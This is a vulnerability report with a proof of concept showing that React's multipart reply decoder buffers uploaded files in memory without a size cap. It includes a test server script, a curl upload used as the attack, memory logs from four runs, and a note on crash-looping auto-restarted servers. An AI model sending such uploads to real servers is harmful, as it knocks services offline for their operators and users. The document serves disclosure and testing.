### A. Vulnerability Summary
A remote attacker can crash a server that uses React's multipart reply decoding by uploading a large file, because React buffers the entire file in memory with no size limit.

### B. Why It Is Exploitable (Root Cause)
In react-server, file parts are accumulated in an in-memory array of chunks with no byte cap:
ReactFlightReplyServer.js (line 1902) creates chunks: [] for each file handle.
ReactFlightReplyServer.js (line 1914) appends every chunk: handle.chunks.push(chunk).
ReactFlightReplyServer.js (line 1926) materializes the whole file into a Blob(handle.chunks, ...).

All Node multipart decoders in the RSC packages feed attacker-controlled chunks into that sink, e.g.:
ReactFlightDOMServerNode.js (line 597) calls resolveFileInfo(...)
ReactFlightDOMServerNode.js (line 599) calls resolveFileChunk(...) on every data event
ReactFlightDOMServerNode.js (line 603) calls resolveFileComplete(...) at end

No __DEV__ gating here; the behavior is production-relevant.

### C. Real-World Impact
Process OOM and crash (or severe GC thrash), taking down SSR/RSC infrastructure.
If autoscaled/restarted, attacker can force crash loops and sustained outage by repeating requests.

### D. Step-by-Step Reproduction
Preconditions: a Node server endpoint that accepts multipart/form-data and uses decodeReplyFromBusboy(...) (directly or via a framework integration) without strict upstream body/file size limits.

Create a minimal repro server (separate folder is easiest):

```bash
mkdir -p /tmp/rsc-file-dos && cd /tmp/rsc-file-dos
npm init -y
npm i react react-dom react-server-dom-webpack busboy
```

Create server.mjs:

```bash
import http from "node:http";
import Busboy from "busboy";

// IMPORTANT: import the ESM entry (not CJS require) so export conditions can apply.
import { decodeReplyFromBusboy } from "react-server-dom-webpack/server.node";

const webpackMap = {};

function mb(n) { return Math.round(n / 1024 / 1024); }

http.createServer((req, res) => {
  if (req.method !== "POST") {
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("POST a multipart body\n");
    return;
  }

  const started = Date.now();
  const bb = Busboy({ headers: req.headers });

  const root = decodeReplyFromBusboy(bb, webpackMap);

  let bytesIn = 0;
  req.on("data", (buf) => (bytesIn += buf.length));

  const memTimer = setInterval(() => {
    const m = process.memoryUsage();
    console.log(
      `[+${((Date.now()-started)/1000).toFixed(1)}s] ` +
      `in=${mb(bytesIn)}MB rss=${mb(m.rss)}MB heapUsed=${mb(m.heapUsed)}MB ext=${mb(m.external)}MB`
    );
  }, 250);

  bb.on("finish", async () => {
    clearInterval(memTimer);
    try { await root; } catch {}
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("done\n");
  });

  req.pipe(bb);
}).listen(3000, "127.0.0.1", () => {
  console.log("listening on http://127.0.0.1:3000");
});


```
Run it:

```bash
node server.mjs
```
Generate a large file (pick a size that will exceed your Node memory limit):

```bash
dd if=/dev/zero of=big.bin bs=10M count=300  # ~3GB
```


Send the attack request:

```bash
curl -F "file=@big.bin" http://127.0.0.1:3000/
```

Verify exploitation:
Watch the server logs: rss should climb roughly with upload size. Eventually the process will stall heavily or terminate (OOM), causing availability loss.

E. Exploit Chain Possibility
Practical chaining is "DoS amplification": if the target has an auto-restart supervisor, repeating the upload keeps it in a restart loop. If your app also has expensive per-request work after decode, this becomes even easier to sustain.




Diffferent tests and outputs:

The server.mjs file is same but the attach payload is different.

### Test 1: 

Run the server.mjs
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ node --conditions=react-server --max-old-space-size=256 server.mjs
listening on http://127.0.0.1:3000
```

Send the Payload:

```bash
[keshavgoyal@hazelnut react]$ dd if=/dev/zero of=big.bin bs=10M count=300   # ~3GB
300+0 records in
300+0 records out
3145728000 bytes (3.1 GB, 2.9 GiB) copied, 1.38812 s, 2.3 GB/s
[keshavgoyal@hazelnut react]$ curl -F "file=@big.bin" http://127.0.0.1:3000/
done
```


Output:
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ node --conditions=react-server --max-old-space-size=256 server.mjs
listening on http://127.0.0.1:3000
[+0.3s] in=176MB rss=224MB heapUsed=9MB ext=179MB
[+0.5s] in=354MB rss=403MB heapUsed=8MB ext=357MB
[+0.8s] in=554MB rss=606MB heapUsed=9MB ext=557MB
[+1.0s] in=758MB rss=812MB heapUsed=9MB ext=761MB
[+1.3s] in=962MB rss=1018MB heapUsed=10MB ext=965MB
[+1.5s] in=1168MB rss=1225MB heapUsed=11MB ext=1171MB
[+1.8s] in=1372MB rss=1431MB heapUsed=11MB ext=1375MB
[+2.0s] in=1576MB rss=1636MB heapUsed=12MB ext=1579MB
[+2.3s] in=1786MB rss=1847MB heapUsed=13MB ext=1789MB
[+2.5s] in=1992MB rss=2055MB heapUsed=13MB ext=1995MB
[+2.8s] in=2196MB rss=2261MB heapUsed=14MB ext=2199MB
[+3.0s] in=2400MB rss=2466MB heapUsed=14MB ext=2403MB
[+3.3s] in=2606MB rss=2674MB heapUsed=15MB ext=2609MB
[+3.5s] in=2810MB rss=2880MB heapUsed=16MB ext=2813MB

```

---
### Test 2: 

Run the server.mjs
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ systemd-run --user --scope -p MemoryMax=800M \
  node --conditions=react-server server.mjs
Running scope as unit: run-r40653a1bec544375aa4b6d7eb8c01287.scope
listening on http://127.0.0.1:3000
```

Send the Payload:

```bash
[keshavgoyal@hazelnut react]$ dd if=/dev/zero of=big-1g.bin bs=1M count=1024
curl -F "file=@big-1g.bin" http://127.0.0.1:3000/
1024+0 records in
1024+0 records out
1073741824 bytes (1.1 GB, 1.0 GiB) copied, 0.467673 s, 2.3 GB/s
done
```


Output:
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ systemd-run --user --scope -p MemoryMax=800M \
  node --conditions=react-server server.mjs
Running scope as unit: run-r40653a1bec544375aa4b6d7eb8c01287.scope
listening on http://127.0.0.1:3000
[+0.3s] in=176MB rss=223MB heapUsed=9MB ext=179MB
[+0.5s] in=370MB rss=419MB heapUsed=9MB ext=373MB
[+0.8s] in=572MB rss=623MB heapUsed=9MB ext=575MB
[+1.2s] in=764MB rss=767MB heapUsed=9MB ext=767MB
[+1.9s] in=766MB rss=722MB heapUsed=9MB ext=769MB
[+2.2s] in=810MB rss=763MB heapUsed=9MB ext=813MB
[+2.5s] in=834MB rss=766MB heapUsed=9MB ext=837MB
[+2.7s] in=862MB rss=766MB heapUsed=9MB ext=865MB
[+3.0s] in=888MB rss=768MB heapUsed=10MB ext=891MB
[+3.2s] in=920MB rss=772MB heapUsed=10MB ext=923MB
[+3.5s] in=952MB rss=773MB heapUsed=10MB ext=955MB
[+3.8s] in=988MB rss=778MB heapUsed=10MB ext=991MB
[+4.0s] in=1016MB rss=776MB heapUsed=10MB ext=1019MB
^C

```



---
### Test 3: 

Run the server.mjs
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ systemd-run --user --scope -p MemoryMax=400M \
  node --conditions=react-server server.mjs
Running scope as unit: run-r721566ba89514e4687e689d73f666440.scope
listening on http://127.0.0.1:3000
```

Send the Payload:

```bash
[keshavgoyal@hazelnut react]$ dd if=/dev/zero of=big-600m.bin bs=1M count=600
curl -F "file=@big-600m.bin" http://127.0.0.1:3000/
600+0 records in
600+0 records out
629145600 bytes (629 MB, 600 MiB) copied, 0.275247 s, 2.3 GB/s
done
```


Output:
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ systemd-run --user --scope -p MemoryMax=400M \
  node --conditions=react-server server.mjs
Running scope as unit: run-r721566ba89514e4687e689d73f666440.scope
listening on http://127.0.0.1:3000
[+0.3s] in=174MB rss=219MB heapUsed=8MB ext=177MB
[+0.5s] in=366MB rss=412MB heapUsed=8MB ext=369MB
[+1.6s] in=374MB rss=317MB heapUsed=8MB ext=377MB
[+2.2s] in=398MB rss=351MB heapUsed=8MB ext=401MB
[+2.5s] in=450MB rss=394MB heapUsed=8MB ext=453MB
[+2.7s] in=476MB rss=393MB heapUsed=8MB ext=479MB
[+3.0s] in=508MB rss=394MB heapUsed=8MB ext=511MB
[+3.2s] in=536MB rss=398MB heapUsed=8MB ext=539MB
[+3.5s] in=566MB rss=400MB heapUsed=8MB ext=569MB
^C

```


```bash
[keshavgoyal@hazelnut react]$ cat /sys/fs/cgroup/$(systemctl --user show -p ControlGroup --value run-*.scope)/memory.events
low 0
high 0
max 5325
oom 0
oom_kill 0
oom_group_kill 0

[keshavgoyal@hazelnut react]$ cg=$(systemctl --user show -p ControlGroup --value run-r721566ba89514e4687e689d73f666440.scope)
cat /sys/fs/cgroup${cg}/memory.events
cat /sys/fs/cgroup${cg}/memory.max
cat /sys/fs/cgroup${cg}/memory.current
low 0
high 0
max 5325
oom 0
oom_kill 0
oom_group_kill 0
419430400
418721792
```

---

### Test 4: 

Edited server.mjs by adding a console error:

```bash
try { await root; }
catch (e) { console.error("root rejected:", e?.name, e?.message); }
```

New script:
```bash

import http from "node:http";
import Busboy from "busboy";

// IMPORTANT: import the ESM entry (not CJS require) so export conditions can apply.
import { decodeReplyFromBusboy } from "react-server-dom-webpack/server.node";

const webpackMap = {};

function mb(n) { return Math.round(n / 1024 / 1024); }

http.createServer((req, res) => {
  if (req.method !== "POST") {
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("POST a multipart body\n");
    return;
  }

  const started = Date.now();
  const bb = Busboy({ headers: req.headers });

  const root = decodeReplyFromBusboy(bb, webpackMap);

  let bytesIn = 0;
  req.on("data", (buf) => (bytesIn += buf.length));

  const memTimer = setInterval(() => {
    const m = process.memoryUsage();
    console.log(
      `[+${((Date.now()-started)/1000).toFixed(1)}s] ` +
      `in=${mb(bytesIn)}MB rss=${mb(m.rss)}MB heapUsed=${mb(m.heapUsed)}MB ext=${mb(m.external)}MB`
    );
  }, 250);

  bb.on("finish", async () => {
    clearInterval(memTimer);
try { await root; }
catch (e) { console.error("root rejected:", e?.name, e?.message); }
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("done\n");
  });

  req.pipe(bb);
}).listen(3000, "127.0.0.1", () => {
  console.log("listening on http://127.0.0.1:3000");
});

```

Run the server.mjs
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ systemd-run --user --scope -p MemoryMax=400M   node --conditions=react-server server.mjs
Running scope as unit: run-r53b643f3859b403cbd95838259305ea3.scope
listening on http://127.0.0.1:3000
```

Send the Payload:

```bash
[keshavgoyal@hazelnut react]$ dd if=/dev/zero of=big-600m.bin bs=1M count=600
curl -F "file=@big-600m.bin" http://127.0.0.1:3000/
600+0 records in
600+0 records out
629145600 bytes (629 MB, 600 MiB) copied, 0.270321 s, 2.3 GB/s
done
```


Output:
```bash
[keshavgoyal@hazelnut rsc-file-dos]$ systemd-run --user --scope -p MemoryMax=400M   node --conditions=react-server server.mjs
Running scope as unit: run-r53b643f3859b403cbd95838259305ea3.scope
listening on http://127.0.0.1:3000
[+0.3s] in=174MB rss=219MB heapUsed=8MB ext=177MB
[+0.5s] in=368MB rss=414MB heapUsed=8MB ext=371MB
[+1.2s] in=374MB rss=350MB heapUsed=8MB ext=377MB
[+1.5s] in=396MB rss=373MB heapUsed=8MB ext=399MB
[+1.9s] in=424MB rss=391MB heapUsed=8MB ext=427MB
[+2.2s] in=454MB rss=394MB heapUsed=8MB ext=457MB
[+2.5s] in=486MB rss=397MB heapUsed=8MB ext=489MB
[+2.7s] in=516MB rss=398MB heapUsed=8MB ext=519MB
[+3.0s] in=544MB rss=400MB heapUsed=8MB ext=547MB
[+3.2s] in=576MB rss=403MB heapUsed=9MB ext=579MB
root rejected: Error Connection closed.

```


```bash
[keshavgoyal@hazelnut react]$ cg=$(systemctl --user show -p ControlGroup --value run-r53b643f3859b403cbd95838259305ea3.scope)
cat /sys/fs/cgroup${cg}/memory.events
cat /sys/fs/cgroup${cg}/memory.max
cat /sys/fs/cgroup${cg}/memory.current
low 0
high 0
max 5407
oom 0
oom_kill 0
oom_group_kill 0
419430400
419287040
```
